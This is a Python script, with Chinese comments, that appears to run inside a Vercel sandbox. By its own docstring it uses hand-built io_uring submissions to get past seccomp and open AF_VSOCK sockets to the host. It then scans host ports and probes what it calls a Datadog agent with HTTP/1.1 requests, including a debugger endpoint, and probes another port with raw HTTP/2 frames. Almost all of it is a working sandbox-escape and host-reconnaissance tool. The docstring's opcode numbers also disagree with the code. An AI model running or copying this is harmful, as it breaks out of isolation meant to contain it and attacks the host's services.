# -*- coding: utf-8 -*-
"""guest_vsock_probe: io_uring 绕过 seccomp 创建 AF_VSOCK socket, 探测 host vsock 服务
目标: CID=2 (host) 端口 1026 (Datadog agent HTTP/1.1) / 2050 (H2)
路径: io_uring_setup -> mmap rings -> IORING_OP_SOCKET(18) -> 包装 python socket -> connect
connect 被拦时备用 IORING_OP_CONNECT(31)
输出落盘 + 哨兵 VSOCK_PROBE_DONE"""
import os, socket, struct, ctypes, time, signal, sys

OUT = '/vercel/sandbox/vsock_probe.out'
f = open(OUT, 'w', encoding='utf-8')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


signal.alarm(150)

libc = ctypes.CDLL(None, use_errno=True)


def syscall(n, *args):
    libc.syscall.restype = ctypes.c_long
    return libc.syscall(n, *args)


# ---- io_uring 常量 ----
SYS_IO_URING_SETUP = 425
SYS_IO_URING_ENTER = 426
IORING_OFF_SQ_RING = 0
IORING_OFF_CQ_RING = 0x8000000
IORING_OFF_SQES = 0x10000000
IORING_OP_SOCKET = 45   # 5.19+ 新增, 枚举编号 45 (18=OPENAT!)
IORING_OP_CONNECT = 16
IORING_ENTER_GETEVENTS = 1
PROT_RW = 3
MAP_SHARED_POP = 0x8001
AF_VSOCK = 40
CID_HOST = 2


class SQRingOffsets(ctypes.Structure):
    _fields_ = [('head', ctypes.c_uint32), ('tail', ctypes.c_uint32),
                ('ring_mask', ctypes.c_uint32), ('ring_entries', ctypes.c_uint32),
                ('flags', ctypes.c_uint32), ('dropped', ctypes.c_uint32),
                ('array', ctypes.c_uint32), ('resv1', ctypes.c_uint32),
                ('user_addr', ctypes.c_uint64)]


class CQRingOffsets(ctypes.Structure):
    _fields_ = [('head', ctypes.c_uint32), ('tail', ctypes.c_uint32),
                ('ring_mask', ctypes.c_uint32), ('ring_entries', ctypes.c_uint32),
                ('overflow', ctypes.c_uint32), ('cqes', ctypes.c_uint32),
                ('resv', ctypes.c_uint64 * 3)]


class Params(ctypes.Structure):
    _fields_ = [('sq_entries', ctypes.c_uint32), ('cq_entries', ctypes.c_uint32),
                ('flags', ctypes.c_uint32), ('sq_thread_cpu', ctypes.c_uint32),
                ('sq_thread_idle', ctypes.c_uint32), ('features', ctypes.c_uint32),
                ('wq_fd', ctypes.c_uint32), ('resv', ctypes.c_uint32 * 3),
                ('sq_off', SQRingOffsets), ('cq_off', CQRingOffsets)]


def setup_uring(entries=8):
    p = Params()
    rfd = syscall(SYS_IO_URING_SETUP, entries, ctypes.byref(p))
    if rfd < 0:
        log('io_uring_setup FAIL errno=%d' % ctypes.get_errno())
        return None
    log('io_uring fd=%d sq=%d cq=%d feat=0x%x' % (rfd, p.sq_entries, p.cq_entries, p.features))
    log('sq_off h=%d t=%d m=%d e=%d a=%d | cq_off h=%d t=%d m=%d e=%d cqes=%d' % (
        p.sq_off.head, p.sq_off.tail, p.sq_off.ring_mask, p.sq_off.ring_entries, p.sq_off.array,
        p.cq_off.head, p.cq_off.tail, p.cq_off.ring_mask, p.cq_off.ring_entries, p.cq_off.cqes))
    libc.mmap.restype = ctypes.c_void_p
    libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]
    sq_sz = p.sq_off.array + p.sq_entries * 4
    cq_sz = p.cq_off.cqes + p.cq_entries * 16
    msz = max(sq_sz, cq_sz)
    base = libc.mmap(None, msz, PROT_RW, MAP_SHARED_POP, rfd, IORING_OFF_SQ_RING)
    if base == ctypes.c_void_p(-1).value:
        log('mmap sq FAIL errno=%d' % ctypes.get_errno())
        return None
    if p.features & 1:
        cq_base = base
    else:
        cq_base = libc.mmap(None, cq_sz, PROT_RW, MAP_SHARED_POP, rfd, IORING_OFF_CQ_RING)
    sqes = libc.mmap(None, p.sq_entries * 64, PROT_RW, MAP_SHARED_POP, rfd, IORING_OFF_SQES)
    log('mmap base=0x%x cq=0x%x sqes=0x%x' % (base, cq_base, sqes))
    return {'fd': rfd, 'p': p, 'base': base, 'cq_base': cq_base, 'sqes': sqes}


def u32(base, off):
    return ctypes.cast(base + off, ctypes.POINTER(ctypes.c_uint32))


def submit(ur, opcode, fd=0, off=0, addr=0, ud=1):
    p = ur['p']
    tail = u32(ur['base'], p.sq_off.tail)[0]
    idx = tail & u32(ur['base'], p.sq_off.ring_mask)[0]
    sqe = ur['sqes'] + idx * 64
    ctypes.memset(sqe, 0, 64)
    ctypes.c_uint8.from_address(sqe).value = opcode
    ctypes.c_int32.from_address(sqe + 4).value = fd
    ctypes.c_uint64.from_address(sqe + 8).value = off
    ctypes.c_uint64.from_address(sqe + 16).value = addr
    ctypes.c_uint64.from_address(sqe + 32).value = ud
    u32(ur['base'], p.sq_off.array)[idx] = idx
    u32(ur['base'], p.sq_off.tail)[0] = tail + 1
    # 必须显式传 sig=NULL, sigsz=0, 否则 r9 垃圾值 -> io_cqring_wait EFAULT
    n = syscall(SYS_IO_URING_ENTER, ur['fd'], 1, 0, IORING_ENTER_GETEVENTS, 0, 0)
    if n < 0:
        return -ctypes.get_errno()
    dl = time.time() + 3
    while u32(ur['cq_base'], p.cq_off.head)[0] == u32(ur['cq_base'], p.cq_off.tail)[0] and time.time() < dl:
        time.sleep(0.005)
    if u32(ur['cq_base'], p.cq_off.head)[0] == u32(ur['cq_base'], p.cq_off.tail)[0]:
        return -999
    cqe = ur['cq_base'] + p.cq_off.cqes + (
        u32(ur['cq_base'], p.cq_off.head)[0] & u32(ur['cq_base'], p.cq_off.ring_mask)[0]) * 16
    res = ctypes.c_int32.from_address(cqe + 8).value
    u32(ur['cq_base'], p.cq_off.head)[0] += 1
    return res


ur = setup_uring()
if not ur:
    log('VSOCK_PROBE_DONE')
    f.close()
    sys.exit(0)

# 对照: 直接 syscall socket (不经 glibc 包装)
r = syscall(41, AF_VSOCK, 1, 0)
log('direct syscall socket(AF_VSOCK) rc=%d errno=%d' % (r, ctypes.get_errno()))
if r >= 0:
    os.close(r)

# 对照 1: IORING_OP_NOP 验证 ring 机制
res = submit(ur, 0, ud=0x777)
log('IORING_OP_NOP res=%d' % res)

# 对照 2: IORING_OP_SOCKET AF_INET 验证 opcode + 提交机制 (seccomp 是否拦 io_uring socket)
res = submit(ur, IORING_OP_SOCKET, fd=2, off=1, addr=0, ud=0x666)
log('IORING_OP_SOCKET AF_INET res=%d' % res)
if res >= 0:
    os.close(res)

# 主目标: IORING_OP_SOCKET AF_VSOCK
res = submit(ur, IORING_OP_SOCKET, fd=AF_VSOCK, off=1, addr=0, ud=0x555)
log('IORING_OP_SOCKET AF_VSOCK res=%d' % res)
if res < 0:
    log('SOCKET_OP 失败, 关闭此线')
    log('VSOCK_PROBE_DONE')
    f.close()
    sys.exit(0)
fd0 = res


def vsock_connect(port, timeout=2.5):
    """每次新 IORING_OP_SOCKET + python 包装 + connect"""
    res = submit(ur, IORING_OP_SOCKET, fd=AF_VSOCK, off=1, addr=0)
    if res < 0:
        return None, 'socket_res=%d' % res
    try:
        s = socket.socket(family=socket.AF_VSOCK, type=socket.SOCK_STREAM, fileno=res)
        s.settimeout(timeout)
        s.connect((CID_HOST, port))
        return s, None
    except Exception as e:
        try:
            os.close(res)
        except Exception:
            pass
        return None, '%s errno=%s' % (type(e).__name__, getattr(e, 'errno', ''))


def recv_all(s, t=2.0):
    s.settimeout(t)
    data = b''
    try:
        while len(data) < 65536:
            c = s.recv(8192)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    except Exception as e:
        log('recv EXC %s' % e)
    return data


def probe_http11(s, port, label):
    reqs = [
        ('GET /info', 'GET /info HTTP/1.1\r\nHost: localhost\r\nAccept: */*\r\nConnection: close\r\n\r\n'),
        ('POST /debugger/v2/input', 'POST /debugger/v2/input HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}'),
        ('GET /', 'GET / HTTP/1.1\r\nHost: localhost\r\nAccept: */*\r\nConnection: close\r\n\r\n'),
        ('GET /agent', 'GET /agent HTTP/1.1\r\nHost: localhost\r\nAccept: */*\r\nConnection: close\r\n\r\n'),
    ]
    for name, req in reqs:
        try:
            s.sendall(req.encode())
            data = recv_all(s, 2.0)
            first = data[:300].decode('latin1', 'replace')
            log('[%s:%d %s] rcvd %dB: %s' % (label, port, name, len(data), first.replace('\r', '\\r').replace('\n', '\\n')[:200]))
            return data
        except Exception as e:
            log('[%s:%d %s] EXC %s' % (label, port, name, type(e).__name__))
        time.sleep(0.4)
    return b''


def probe_h2(s, port):
    try:
        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        s.sendall(b'\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00')  # SETTINGS 空帧
        time.sleep(0.3)
        hp = b'\x83\x86\x84' + b'\x41\x09localhost'
        hdrs = b'\x00\x00\x0e\x01\x05\x00\x00\x00\x01' + hp  # HEADERS stream1 END_HEADERS|END_STREAM
        s.sendall(hdrs)
        time.sleep(1.5)
        data = recv_all(s, 2.5)
        log('[h2:%d] rcvd %dB hex=%s' % (port, len(data), data[:100].hex()))
        return data
    except Exception as e:
        log('[h2:%d] EXC %s' % (port, type(e).__name__))
        return b''


# ---- 主探测 ----
log('=== vsock 端口面 ===')
PORTS = [1026, 2050, 1025, 1027, 1028, 1029, 1030, 2049, 2051, 2055, 5000, 9001, 9002]
opened = {}
for port in PORTS:
    s, err = vsock_connect(port)
    if s:
        log('PORT %d CONNECT OK' % port)
        opened[port] = s
        time.sleep(0.5)
        continue
    log('PORT %d %s' % (port, err))
    time.sleep(0.3)

log('=== 1026 HTTP/1.1 探测 (Datadog agent) ===')
if 1026 in opened:
    probe_http11(opened[1026], 1026, 'dd')
    opened[1026].close()

log('=== 2050 H2 探测 ===')
if 2050 in opened:
    probe_h2(opened[2050], 2050)
    opened[2050].close()

# 其他端口内容粗探
for port in [1025, 1027, 1028, 1029, 1030, 2049, 2051, 2055, 5000, 9001, 9002]:
    if port in opened:
        try:
            opened[port].sendall(b'GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n')
            data = recv_all(opened[port], 1.5)
            log('PORT %d rcvd %dB: %s' % (port, len(data), data[:150].decode('latin1', 'replace')))
            opened[port].close()
        except Exception as e:
            log('PORT %d EXC %s' % (port, type(e).__name__))
            try:
                opened[port].close()
            except Exception:
                pass

log('VSOCK_PROBE_DONE')
f.close()
